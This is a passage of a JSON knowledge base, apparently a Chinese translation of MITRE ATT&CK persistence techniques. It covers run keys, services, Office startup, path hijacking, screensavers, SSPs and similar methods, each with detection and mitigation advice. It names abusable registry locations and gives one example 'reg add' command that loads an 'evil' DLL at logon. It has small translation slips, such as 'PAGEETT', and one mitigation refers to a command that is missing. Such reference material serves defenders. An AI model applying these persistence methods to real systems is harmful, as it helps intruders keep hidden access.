	"description": "<p>命令行脚本实用程序Netsh.exe（也称为Netshell）用于与系统网络配置交互。它包含添加辅助动态链接库以扩展实用程序功能的功能。已注册的netsh.exe辅助程序动态链接库的路径输入到<code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>的Windows注册表中。</p><p>当使用其它持久性技术自动执行netsh.exe或者在执行netsh.exe（功能需要）的系统上存在其他持久软件时，攻击者可能会使用带有辅助动态链接库的netsh.exe以持久方式代理执行任意代码。比如，调用netsh.exe的VPN软件。</p><p>POC代码证明，使用netsh.exe辅助程序动态链接库加载Cobalt Strike的有效负载。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["动态链接库监控", "Windows注册表", "进程监控"]
	},
	"relations": {
		"detection": "<p>在大多数环境中，netsh.exe拥有任何子进程都可能是不寻常的。监控进程执行并调查netsh.exe为恶意行为生成的子进程。监控<code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>注册表项来查看是否有与已知系统文件或良性软件不相关的任何新条目或可疑条目。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "Netsh Helper DLL"
}, {
	"id": "T1050",
	"description": "<p>操作系统启动时，可以启动称为服务的程序或应用来执行后台系统功能。服务配置信息，包括服务可执行文件路径，存储在Windows注册表中。</p><p>攻击者可能会安装一个新的服务，并配置服务在启动时执行（通过使用实用程序与服务交互或直接修改注册表）。服务名称可以伪装为相关操作系统或良性软件中的名称。服务可能会是以管理员权限创建，但在系统权限下执行。因此，攻击者也可能使用服务将权限级别从管理员提升到系统。攻击者也可能通过服务执行技术来直接启动服务。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["Windows注册表", "进程监控", "进程命令行参数", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>通过查看注册表是否有改动或者常见实用程序是否有命令行调用来监控服务创建。创建新服务可能会有可变事件生成，比如，事件4697和事件7045。安装新软件过程中可能会创建新的良性服务。不应孤立地看待数据和事件，而应将其视为可能导致其他活动的一系列行为中的一部分，例如为命令与控制而建立网络连接，通过发现了解环境的详细信息，以及横向移动。</p><p>也可使用Sysinternals Autoruns等工具来检测是否有旨在获得持久性的系统更改。查看是否有与已知软件、补丁周期等不相关的服务更改。通过服务执行的可疑程序可能会显示为异常进程。与历史数据进行比较时，这些进程以前从未出现过。</p><p>监控服务创建的相关进程和命令行参数。带内置功能的远程访问工具可以直接与Windows API交互，在典型系统实用程序之外执行这些功能。还可以通过Windows系统管理工具（如Windows Management Instrumentation和Powershell）来创建服务。如果通过此方式创建服务，可能还需要配置日志功能来收集适当的数据。</p>",
		"mitigations": [{
			"name": "用户账号管理",
			"description": "限制用户账号权限并调整权限提升途径，以便只有授权管理员才能创建新服务。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "新建服务"
}, {
	"id": "T1137",
	"description": "<p>Microsoft Office是企业网络中Windows操作系统上相当常见的应用套件。启动基于Office的应用时，可以使用多种配套Office的机制获得持久性。</p><p>办公模板宏</p><p>Microsoft Office包含的模板是常见Office应用的一部分，用于自定义样式。每当应用启动时都会使用应用中的基本模板。</p><p>Office VBA（Visual Basic for Applications）可以插入到基本模板中，并在相应的Office应用启动时执行代码，从而获得持久性。已发现并发布了Word和Excel的示例。默认情况下，Word自带normal.dotm模板，该模板可以修改并插入恶意宏。Excel没有默认模板文件，但是可以添加一个。添加后，会自动加载此模板。共享目标也可以存储在远程位置并从远程位置获取。</p><p>Word模板Normal.dotm的位置：<code>C:\\Users(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code></p><p>Excel模板Personal.xlsb的位置：<code>C:\\Users(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code></p><p>攻击者还可能会通过劫持应用程序搜索顺序（比如，Word 2016首先在<code>C:\\Program Files(x86)\\Microsoft Office\\root\\Office16\\</code>下查找Normal.dotm）或者通过修改注册表项GlobalDotName来将基础模板位置更改成他们自己指定的位置。攻击者可以通过修改注册表项GlobalDotName来指定一个任意位置、文件名和文件扩展名给应用程序启动时将会加载的模板。要滥用GlobalDotName，攻击者可能需要首先注册模板为受信任文档或将其放在受信任的位置。</p><p>Office测试</p><p>发现一个注册表位置。一个动态链接库引用放在此处时，每次Office应用启动后，都会执行二进制路径指向的相应动态链接库。</p><p><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Officetest\\Special\\Perf</code></p><p>加载项</p><p>使用Office加载项可向Office程序添加功能。</p><p>加载项也可用于获取持久性，因为它们可以设置为在Office应用启动时执行代码。各种Office产品可以使用不同类型的加载项，包括Word/Excel加载项库（WLL/XLL）、VBA加载项、Office COM加载项、自动化加载项、VBA编辑器（VBE）、VSTO（Visual Studio Tools for Office）加载项和Outlook加载项。</p><p>Outlook规则、表单和主页</p><p>Outlook中发现了多种可被滥用以获得持久性的功能，如Outlook规则、表单和主页。这些持久性机制可以在Outlook中运行，也可以通过Office 365使用。</p><p>Outlook规则允许用户定义自动行为来管理电子邮件。例如，定义一条规则让Outlook自动将特定发件人的包含特定单词的邮件转移到特定文件夹。攻击者可能会创建恶意规则让Outlook在攻击者发送邮件给指定用户后触发代码执行。</p><p>Outlook表单在Outlook邮件中用作演示文稿和功能模板。攻击者可能会创建自定义Outlook表单。使用此表单发送他们特制的电子邮件时会触发代码执行。</p><p>Outlook主页是Outlook的老功能，用于自定义Outlook文件夹的演示文稿。此功能允许文件夹打开时加载和显示内部或外部URL。攻击者可能会制作恶意HTML页面。Outlook主页加载此页面时会触发代码执行。</p><p>要使用这些功能，攻击者需要事先通过Exchange / OWA服务器或客户端应用访问用户的Outlook邮箱。一旦恶意规则、表单或主页添加到用户的邮箱，Outlook启动时就会加载它们。如果是恶意主页，用户邮箱加载/重新加载正确的Outlook文件夹时会执行恶意主页。如果是恶意规则或表单，攻击者发送特制邮件给用户时，会执行恶意规则或表单。</p>",
	"details": {
		"platform": ["Windows", "Office 365"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["进程监控", "进程命令行参数", "Windows注册表", "文件监控"]
	},
	"relations": {
		"detection": "<p>许多Office相关的持久性机制要求更改注册表，并将二进制、文件或脚本写入磁盘或修改现有文件使其包含恶意脚本。收集注册表项创建和修改相关事件，获取用于Office持久性的表项。研究基本模板（如Normal.dotm）的修改点，因为基本模板可能不包含VBA宏。还应调查Office宏安全设置的修改点。</p><p>监控并验证文件系统上的Office受信任位置，并审核与启用加载项相关的注册表项。</p><p>非标准进程执行树也可能指示可疑或恶意行为。收集进程执行信息，包括PID（进程ID）和PPID（父进程ID），并查找Office进程导致的异常活动链。如果其他攻击技术相关的可疑进程或活动的父进程是winword.exe，则可能表示该应用被恶意使用。</p><p>对于利用Outlook规则和表单的情况，微软已发布PowerShell脚本来妥善收集邮件环境中的邮件转发规则和自定义表单以及解释输出的步骤。SensePost的工具Ruler也会被攻击者用来执行恶意规则、表单和主页攻击。针对这种情况，SensePost发布了一个工具来检测Ruler的使用情况。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "遵循适合您环境的Office宏安全最佳实践。禁止执行Office VBA宏。禁用Office加载项。如果需要，请遵循最佳实践来保护它们，方法是要求对其签名并禁用允许加载项的用户通知。对于某些加载项类型（WLL，VBA），可能需要额外的措施，因为在Office信任中心禁用加载项并不会禁用WLL，也不会阻止VBA代码执行。"
		}, {
			"name": "软件配置",
			"description": "对于利用Office测试的情况，创建用来执行此测试的注册表项并将其权限设置为“读取控制”，防止攻击者在没有管理员权限的情况下轻松访问密钥或防止权限提升的要求。"
		}, {
			"name": "软件更新",
			"description": "对于利用Outlook的情况，仅仅阻止宏使用是没有效果的，因为Visual Basic引擎与宏脚本引擎是分开的。微软已经发布了补丁，设法解决这些问题。确保系统已做如下更新：KB3191938，阻止Outlook Visual Basic并显示恶意代码警告；KB4011091，默认情况下禁用自定义表单；KB4011162，删除老的主页功能。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "Office应用启动"
}, {
	"id": "T1034",
	"description": "<p>路径拦截指的是将可执行文件放置在特定路径中，以便应用程序执行此文件而不是本应执行的目标文件。其中一个例子是在易受攻击的应用程序的当前工作目录中使用cmd副本，用于通过CreateProcess函数加载CMD或BAT文件。</p><p>攻击者可能会利用多个明显漏洞或配置错误来执行路径拦截，包括：未引用的路径、路径环境变量错误配置及搜索顺序劫持。如果有完整程序路径，第一个漏洞会被利用；如果程序路径未指定，则第二个和第三个漏洞会被利用。如果可执行文件是定期调用，攻击者可能会使用这些技术来获得持久性；如果截获的可执行文件由较高权限进程启动，攻击者可能会使用这些技术来提升权限。</p><p>未引用的路径</p><p>如果服务路径（存储在Windows注册表项中）和快捷路径具有一个或多个空格并且没有用引号引起来（例如<code>C:\\unsafe path with space\\program.exe</code>），则容易受到拦截。攻击者可以将可执行文件放在路径的更高级别的目录中，Windows将解析该文件而不是预期的目标可执行文件。例如，如果快捷方式中的路径为<code>C:\\program files\\myapp.exe</code>，则攻击者可以在<code>C:</code><code>\\</code><code>program.exe</code>中创建程序，用来替代预期的目标程序。</p><p>PATH环境变量配置错误</p><p>PATH环境变量包含目录列表。如果程序路径未指定，某些程序执行方法（即使用cmd.exe或命令行）仅依赖于PATH环境变量来确定程序搜索位置。如果PATH环境变量的Windows目录（<code>%SystemRoot%\\system32</code>，例如，<code>C:\\Windows\\system32</code>）前有任何其它目录，则攻击者会将一个程序放置在此与Windows程序（例如，cmd、PowerShell或Python）同名的目录中，以便从脚本或命令行执行命令来执行此程序。</p><p>例如，如果PATH环境变量中的<code>C:\\Windows\\system32</code>前存在<code>C:\\example path</code>且攻击者在<code>C:\\example path</code>下放置了net.exe程序，则在从命令行执行net命令时会调用net.exe程序，而非Windows系统的“net”。</p><p>搜索顺序劫持</p><p>如果程序路径未指定，则Windows会按照一定顺序搜索此程序。攻击者可能会劫持此搜索顺序。搜索顺序因用于执行程序的方法而异。但是，Windows通常先搜索启动程序的目录，然后再搜索Windows系统目录。发现某目标程序的搜索顺序易受劫持时（即程序的可执行文件路径未指定时），攻击者可能会利用此漏洞来创建一个新的程序，用目标程序来命名此新程序，并将此新程序放置到启动程序目录下。</p><p>例如，\"example.exe\"使用命令行参数<code>net user</code>运行\"cmd.exe\"。攻击者可能会将名为\"net.exe\"的程序放在与example.exe相同的目录中，则将会运行net.exe而非Windows系统实用程序net。此外，如果攻击者将名为\"net.com\"的程序放在与\"net.exe\"相同的目录中，则<code>cmd.exe /C </code><code>net user</code>将根据PAGEETT下定义的可执行扩展的顺序来执行\"net.com\"而不是\"net.exe\"。</p><p>搜索顺序劫持也是劫持DLL负载的一种常见做法，并在DLL搜索顺序劫持中进行了介绍。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控以部分目录命名的文件以及可能通过环境变量搜索常见进程的位置创建的文件，或者不应是用户可写的文件。监控针对部分目录命名的可执行路径的执行过程。监控以 Windows 系统程序命名的程序的文件创建，这些程序通常在没有路径的情况下执行（如\"findstr\"、\"net\"和\"python\"）。如果此活动发生在已知的管理活动、升级、安装或修补程序之外，则可能是可疑的。</p><p>不应孤立地查看数据和事件，而应将其视为可能导致其他活动的行为链的一部分，例如为命令与控制而建立的连接、通过发现了解环境的详细信息以及横向移动。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "如果功能允许，请在程序配置文件，脚本，PATH环境变量，服务以及快捷方式中查找并清除路径拦截漏洞，方法是将PATH变量的值括在引号中。请注意Windows用于执行或加载二进制文件的搜索顺序，并酌情使用完全限定的路径。卸载软件时，请清理旧的Windows 注册表项，以避免遗留没有关联合法二进制文件的表项。定期搜索并更正或报告系统中的路径拦截漏洞，这些漏洞可能是由会报告使用不安全路径配置软件的自定义或可用工具引入的。"
		}, {
			"name": "执行预防",
			"description": "攻击者可能需要将新的二进制文件放置在目标位置以便利用漏洞来执行。如果适用，使用应用程序白名单工具（如Windows Defender Application Control，AppLocker或软件限制策略）来识别和阻止通过搜索顺序劫持技术植入的恶意软件。"
		}, {
			"name": "文件和目录权限限制",
			"description": "要求将所有可执行文件放在受写入保护的目录中。"
		}, {
			"name": "用户帐户管理",
			"description": "确保设置了适当的权限和目录访问控制，以阻止用户将文件写入顶级目录C：和系统目录（如C:\\Windows\\），减少恶意文件被植入和执行的可能。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "路径拦截"
}, {
	"id": "T1150",
	"description": "<p>属性列表 （plist） 文件包含 macOS 和 OS X 用于配置应用程序和服务的所有信息。这些文件经过UTF-8编码，并像XML文档一样通过一系列用&lt;&gt;包围的键格式化。它们详细说明了程序应在何时应执行、可执行文件路径、程序参数、所需的操作系统，等等。plists 位于特定位置，具体取决于其用途，例如<code>/Library/Preferences</code>（以提升的权限执行）和<code>~/Library/Preferences</code>（以用户权限执行）。攻击者可能会修改这些 plist 文件以指向自己的代码或使用它们在另一个用户的上下文中执行其代码，从而绕过白名单过程，甚至将它们用作持久性机制。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控文件系统来确定plist 文件是否正在被修改。大多数情况下，用户不应有修改plist 文件的权限。某些软件工具（如Knock Knock）可以检测持久性机制，并指向正在被引用的特定文件。这有助于查看实际执行的内容。</p><p>监控进程执行，查看由修改的 plist 文件产生的异常进程的执行。监控用于修改 plist 文件或将 plist 文件作为参数的实用程序，这可能表示有可疑活动。</p>",
		"mitigations": [{
			"name": "文件和目录权限限制",
			"description": "设置 plist 文件为只读文件，防止用户修改这些文件。"
		}],
		"tactics": ["TA0005", "TA0003", "TA0004"]
	},
	"name": "Plist修改"
}, {
	"id": "T1205",
	"description": "<p>端口试探是防御者和攻击者都会使用的、用来隐藏开放端口以阻止访问的成熟方法。要启用端口，攻击者会在打开端口之前发送一系列具有特定特征的数据包。通常，这一系列数据包包括尝试连接到预定义的封闭端口序列，但可能涉及异常标志、特定字符串或其他唯一特征。序列完成后，打开端口通常由基于主机的防火墙完成，但也可以通过自定义软件实现。</p><p>这项技术已被观察到用于动态打开侦听端口以及启动与不同系统上的侦听服务器的连接。</p><p>可以通过不同方法对触发通信的信号数据包进行观察。最初由Cd00r实现的一种方法是使用libpcap库来嗅探有问题的数据包。另一种方法是利用原始套接字，使恶意软件能够使用已打开供其他程序使用的端口。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户"]
	},
	"relations": {
		"detection": "<p>记录发送到系统或从系统发出的网络数据包，查找不属于已建立流的无关数据包。</p>",
		"mitigations": [{
			"name": "过滤网络流量",
			"description": "可通过使用状态防火墙来缓解此技术的某些变体的影响，具体取决于其实现方式。"
		}],
		"tactics": ["TA0005", "TA0003", "TA0011"]
	},
	"name": "端口试探"
}, {
	"id": "T1013",
	"description": "<p>可以通过API调用设置端口监视器，设置在动态链接库启动时加载它。此动态链接库可以位于<code>C:\\Windows\\System32</code>，并在启动时由打印后台处理程序服务spoolsv.exe加载。spoolsv.exe进程也在系统级别权限下运行。或者，如果权限允许将动态链接库的完全限定路径名写入<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>，则可以加载任意动态链接库。</p><p>注册表项包含以下内容：</p><p>·         本地端口</p><p>·         标准TCP/IP端口</p><p>·         USB监视器</p><p>·         WSD端口</p><p>攻击者可能会使用此技术在启动时加载恶意代码，这些代码即便在系统重启后仍存在并且以系统权限执行。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["文件监控", "API监控", "动态链接库监控", "Windows注册表", "进程监控"]
	},
	"relations": {
		"detection": "<p>·         监控进程API调用。</p><p>·         监控spoolsv.exe加载的异常动态链接库。</p><p>·         观察是否有与已知良性软件或补丁无关的新动态链接库写入到System32目录的情况。</p><p>·         监控注册表写入<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>。</p><p>·         运行Autoruns实用程序，该实用程序检查用于持久性机制的注册表项。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "端口监控"
}, {
	"id": "T1504",
	"description": "<p>某些情况下，攻击者可能会通过滥用PowerShell配置文件来获得持久性和提升权限。PowerShell配置文件（<code>profile.ps1</code>）是在PowerShell启动时运行的脚本，可用作登录自定义用户环境的脚本。根据用户或主机程序，PowerShell支持多个配置文件。例如，PowerShell主机程序（例如PowerShell控制台、PowerShell ISE或者Visual Studio Code）可以有不同配置文件。管理员也可以配置适用于本地计算机上所有用户和主机程序的配置文件。</p><p>攻击者可能会修改这些配置文件，配置任意恶意命令、功能、模块和/或PowerShell驱动器来获得持久性。每当用户打开一个PowerShell会话，都会执行修改后的脚本，除非脚本在启动时使用了<code>-NoProfile</code>标志。</p><p>如果PowerShell配置文件中的某个脚本由较高权限的账户（例如域管理员）加载并执行，则攻击者还可能会提升权限。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["进程监控", "文件监控", "PowerShell日志"]
	},
	"relations": {
		"detection": "<p>应监控<code>profile.ps1</code>的存储位置，查看是否有新的配置文件或者是否有修改。配置文件位置示例如下：</p><p><code>·         </code><code>$PsHome\\Profile.ps1</code></p><p><code>·         </code><code>$PsHome\\Microsoft.{{HostProgram}}_profile.ps1</code></p><p><code>·         </code><code>$Home\\My Documents\\PowerShell\\Profile.ps1</code></p><p>·         <code>$Home\\MyDocuments\\PowerShell\\Microsoft.{{HostProgram}}_profile.ps1</code></p><p>监控异常PowerShell命令、PowerShell驱动器或模块的异常加载和/或未知程序的执行。</p>",
		"mitigations": [{
			"name": "代码签名",
			"description": "强制仅执行签名的PowerShell脚本。对配置文件进行签名，以免其遭受修改。"
		}, {
			"name": "文件和目录权限限制",
			"description": "使PowerShell配置文件不可变且只能由某些管理员更改，这将限制攻击者轻易就能创建用户级持久性的能力。"
		}, {
			"name": "软件配置",
			"description": "如果不需要，请避免使用PowerShell配置文件。远程执行PowerShell脚本时，请使用-No Profile标志，以防攻击者执行本地配置文件和脚本。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "PowerShell配置文件"
}, {
	"id": "T1163",
	"description": "<p>在启动过程中，macOS 执行<code>source /etc/rc.common</code>，这是一个包含各种实用程序函数的shell 脚本。此文件还定义了用于处理命令行参数和收集系统设置的例程，因此建议包含在启动项脚本的开头中。在 macOS 和 OS X 中，现在已不推荐使用此方法，而建议使用启动代理和启动守护程序，但目前仍在使用。</p><p>攻击者可能会使用 rc.common 文件来隐藏代码以获得持久性，这些代码将在每次重新启动时以root用户执行。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["root用户"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>通过监控/etc/rc.<code>common</code>文件来检测公司策略中的更改。监控由rc.common脚本导致的异常或未知应用程序或行为的进程执行。</p>",
		"mitigations": [{
			"name": "用户帐户管理",
			"description": "限制用户权限，以便只有授权用户可以编辑 rc.common 文件。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "Rc.common"
}, {
	"id": "T1164",
	"description": "<p>从Mac OS X 10.7（Lion）开始，用户可以指定在用户重新启动计算机时重新打开的某些应用程序。这通常是通过图形用户界面（GUI）逐个应用完成的，但也有包含此信息的属性列表文件（plist），位于<code>~/Library/Preferences/com.apple.loginwindow.plist</code>和<code>~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist</code>。</p><p>攻击者可能会直接修改这些文件之一，在文件中配置链接指向恶意可执行文件，以便他们在每次用户重新启动计算机时获得持久性。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["用户"]
	},
	"relations": {
		"detection": "<p>监控与重新打开应用程序关联的特定的plist文件，查看应用程序何时注册以重新打开。</p>",
		"mitigations": [{
			"name": "禁用或删除功能或程序",
			"description": "可使用如下终端命令完全禁用此功能："
		}, {
			"name": "用户培训",
			"description": "登录时按住Shift键可防止应用自动打开。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "重新打开应用"
}, {
	"id": "T1108",
	"description": "<p>攻击者可能会使用多种支持不同C2协议的远程访问工具或通过凭据访问远程服务，从而在被检测到访问机制时仍能保持访问。</p><p>如果检测到某种类型的工具并进行了拦截或删除作为响应，但组织没有完全了解攻击者的工具和访问权限，则攻击者将能够保留对网络的访问权限。尽管目标网络中部署的远程访问工具受到中断，攻击者还可能尝试访问有效帐户，以使用外部远程服务（如外部 VPN）作为维护访问的一种方式。攻击者还可能通过云化基础设施和设备来保留访问。</p><p>Web Shell是一种通过外部可访问的Web服务器维护网络访问的方式。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "AWS", "GCP", "Azure", "Office 365", "SaaS", "Azure AD"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["Office 365账户日志", "Azure活动日志", "AWS CloudTrail日志", "Stackdriver日志", "进程监控", "进程使用网络", "网络抓包", "网络协议分析", "文件监控", "认证日志", "二进制文件元数据"]
	},
	"relations": {
		"detection": "<p>现有的远程访问工具检测方法非常有用。备份远程访问工具或其他接入点在入侵期间可能没有建立命令与控制通道，因此传输的数据量可能不如主通道高，除非访问丢失。</p><p>检测基于信标流量、命令与控制协议或攻击者基础结构的工具需要事先了解攻击者可能使用的工具、IP地址和/或域的威胁情报，并且有能力检测网络边界上的使用情况。如果有可用的工具来扫描这些指标，则事先了解危害指标也有助于检测端点上的攻击者工具。</p><p>如果正遭受入侵，并且收集了足够的端点数据或已解码的命令与控制流量，则防御程序可能能够检测到攻击者执行操作时使用的其他工具。</p><p>对于使用外部可访问的VPN或远程服务的访问，请按照“有效帐户”和“外部远程服务”下的检测建议来收集帐户使用信息。</p>",
		"mitigations": [{
			"name": "网络入侵防护",
			"description": "使用通过网络签名识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别的活动影响。签名通常是协议中的唯一指示符，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C2签名，或者构建协议来逃避常见防御工具的检测。"
		}],
		"tactics": ["TA0005", "TA0003"]
	},
	"name": "冗余访问"
}, {
	"id": "T1060",
	"description": "<p>向注册表或启动文件夹中的“运行键”添加条目会导致在用户登录时执行引用的程序。这些程序将在用户的上下文中执行，并具有账号的相关权限级别。</p><p>默认情况下，在Windows系统上创建以下运行键：<code><i>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</i></code><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<i>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</i>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code></p><p>也可用<code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> ，但默认情况下不会在WindowsVista及更高版本上创建。注册表运行键条目可以直接引用程序或将它们列为依赖项。例如，可以使用RunOnceEx的“Depend”键在登录时加载动态链接库：<code>reg addHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d\"C:\\temp\\evil[.]dll\"</code></p><p>以下注册表项可用于设置启动文件夹项来获得持久性：</p><p><code><i>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserShell Folders</i></code><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders<i>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellFolders</i>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserShell Folders</code></p><p>攻击者可能会使用这些配置位置来执行恶意软件，例如远程访问工具，通过系统重启来维持持久性。攻击者还可能会使用伪装技术，使注册表项看起来好像与合法程序相关。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["Windows注册表", "文件监控"]
	},
	"relations": {
		"detection": "<p>监控注册表中与已知软件、补丁周期等不相关运行键的更改。监控启动文件夹的添加或更改。也可使用Sysinternals Autoruns等工具来检测是否有旨在获得持久性的系统更改，包括列出运行建的注册表位置以及启动文件夹。可疑程序作为启动程序执行的话，会显示为异常进程。因为与历史数据进行比较时，这些进程从未出现过。</p><p>当安装了合法软件时，这些位置的更改通常视为正常情况。为了增加恶意活动的可信度，不应孤立地看待数据和事件，而应将其视为可能导致其他活动的一系列行为中的一部分，例如为命令与控制而建立网络连接，通过发现了解环境的详细信息，以及横向移动。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "注册表运行键/启动文件夹"
}, {
	"id": "T1180",
	"description": "<p>屏幕保护程序在用户不活动一定时间之后执行，此段时长可配置。屏幕保护程序文件是PE（可移植可执行）文件，扩展名为.scr。Windows屏幕保护程序scrnsave.scr与其它基础安装中的屏幕保护程序一起放置在 32位操作系统中的<code>C:\\Windows\\System32\\</code>，或64位操作系统中的<code>C:\\Windows\\sysWOW64\\</code> 。</p><p>以下屏幕保护程序设置存储在注册表（<code>HKCU\\Control Panel\\Desktop\\</code>）中。攻击者可能会操控它们来实现持久性：</p><p>·         <code>SCRNSAVE.exe</code> - 设置为恶意PE路径</p><p>·         <code>ScreenSaveActive</code>- 设置为“1”，启用屏幕保护程序</p><p>·         <code>ScreenSaverIsSecure</code> - 设置为“0”，不需要密码即可解锁</p><p>·         <code>ScreenSaverTimeout</code> – 设置用户的不活动时长，超过这个时长即启动屏幕保护程序</p><p>攻击者可能会设置屏幕保护程序在用户不活动一定时间后运行恶意软件来维持持久性。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数", "Windows注册表", "文件监控"]
	},
	"relations": {
		"detection": "<p>监控.scr文件的进程执行和命令行参数。监控注册表中与典型用户行为无关的屏幕保护程序配置更改。</p><p>也可使用Sysinternals Autoruns等工具来检测注册表中屏幕保护程序二进制路径的更改。可疑路径和PE文件可能指示网络中合法屏保存在异常情况，应进行调查。</p>",
		"mitigations": [{
			"name": "特性/程序禁用或删除",
			"description": "如果不需要屏幕保护程序，请使用组策略来禁用它。"
		}, {
			"name": "执行预防",
			"description": "阻止.scr文件从非标准位置执行。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "屏幕保护"
}, {
	"id": "T1101",
	"description": "<p>Windows SSP（Windows安全支持提供程序）动态链接库在系统启动时加载到LSA（本地安全机构）进程中。一旦加载到LSA中，SSP动态链接库可以访问存储在Windows中的加密和明文密码，例如任何登录用户的域密码或智能卡PIN码。SSP配置存储在两个注册表项中：<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code>和<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\SecurityPackages</code>。攻击者可能会修改这些注册表项来添加新的SSP。这些SSP将在下次系统启动时加载，或者在调用AddSecurityPackage Windows API函数时加载。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员"],
		"dataSources": ["动态链接库监控", "Windows注册表", "已加载动态链接库"]
	},
	"relations": {
		"detection": "<p>监控注册表来查看SSP注册表项是否有更改。监控LSA进程来查看是否有动态链接库加载的情况。Windows 8.1和Windows Server 2012 R2中，在注册表项<code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File ExecutionOptions\\LSASS.exe</code>中设置AuditLevel = 8来加载未签名的SSP动态链接库到LSA时会生成事件。</p>",
		"mitigations": [{
			"name": "特权进程完整性",
			"description": "Windows 8.1，Windows Server 2012 R2和更高版本中，可以通过设置注册表项HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL使LSA作为PPL（Protected Process Light）运行，这需要微软对所有SSP动态链接库进行签名。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "安全支持提供者"
}, {
	"id": "T1505",
	"description": "<p>攻击者可能会滥用服务器应用程序的合法可扩展开发功能来建立对系统的持久访问。企业服务器应用程序可能包括允许应用程序开发人员编写和安装软件来扩展主应用程序功能的特性。攻击者可能会安装恶意软件组件从而恶意扩展和滥用服务器应用程序。</p><p>传输代理</p><p>Microsoft 